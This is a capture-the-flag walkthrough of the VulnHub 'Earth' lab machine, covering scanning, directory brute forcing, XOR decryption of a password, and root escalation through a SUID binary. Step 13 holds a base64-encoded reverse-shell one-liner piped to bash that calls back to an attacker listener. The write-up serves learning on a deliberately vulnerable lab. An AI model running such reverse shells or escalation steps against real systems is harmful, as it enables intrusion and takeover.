## Full Walkthrough: Earth VulnHub CTF

**By: Houston Jones**

### Step 1: Network Discovery
Used `sudo arp-scan -l` to discover devices on the local network.

### Step 2: Port Scanning
Ran `nmap -sV -Pn 10.0.2.6` and found ports 22, 80, and 443 open.

### Step 3: DNS and Service Detection
Used `sudo nmap -p- -sC -sV -T4 192.168.56.104` to scan for additional services.
Discovered two DNS names: `earth.local` and `terratest.earth.local`.

### Step 4: Configure Hosts File
Edited `/etc/hosts` with:
```
192.168.56.104  earth.local
192.168.56.104  terratest.earth.local
```

### Step 5: Web Reconnaissance
Visited `earth.local`, saw encrypted messages. Added a new message.

### Step 6: Directory Brute Force
Used Gobuster:
```
gobuster dir --url https://earth.local -w /usr/share/wordlists/dirb/common.txt -k
```
Discovered `/admin` page.

### Step 7: Admin Page
Visited `https://earth.local/admin` and found a login portal.

### Step 8: Explore Second Domain
Visited `https://terratest.earth.local` — displayed “Test site, please ignore.”
Ran Gobuster on this domain:
```
gobuster dir -u https://terratest.earth.local/ -k -w /usr/share/wordlists/dirb/common.txt
```
Discovered `robots.txt` and `testingnotes.txt`.

### Step 9: Analyze Notes
Found encryption used was XOR. Prepared to decrypt the encrypted messages from earlier.

### Step 10: Decryption Using CyberChef
Used 'From Hex' + 'XOR' operations in CyberChef.
Decoded final message: `earthclimatechangebad4humans`

### Step 11: Login to Admin Portal
Used:
```
Username: terra
Password: earthclimatechangebad4humans
```
Gained access to CLI-like command box.
Ran `ls /var/earth_web` and found `user_flag.txt`

### Step 12: Capture User Flag
Ran `cat /var/earth_web/user_flag.txt` to view contents.

### Step 13: Establish Reverse Shell
Started listener:
```
nc -lvnp 4444
```
Ran:
```
echo 'bmMgLWUgL2Jpbi9iYXNoIDEwLjAuMi4xNSA0NDQ0Cg' | base64 -d | bash
```

### Step 14: Reverse Shell Confirmed
Adjusted the payload to include `/s` and verified shell with `whoami` → got `apache`.

### Step 15: Check SUID Binaries
Looked for SUID binaries for privilege escalation. Initially missed `reset_root` because I wasn’t in bash.

### Step 16: Executing reset_root
Ran `reset_root`, confirmed remote access. Required password for root.

### Step 17: Analyze Binary with ltrace
Made `reset_root` executable, ran with ltrace.
Discovered it checks for three specific access files.
Created those files, reran reset_root.
Found root password: `Earth`

### Step 18: Root Access
Switched to root with password `Earth`, verified with `whoami`.
Listed directory, found and displayed the final flag.

Successfully completed Earth VM CTF!
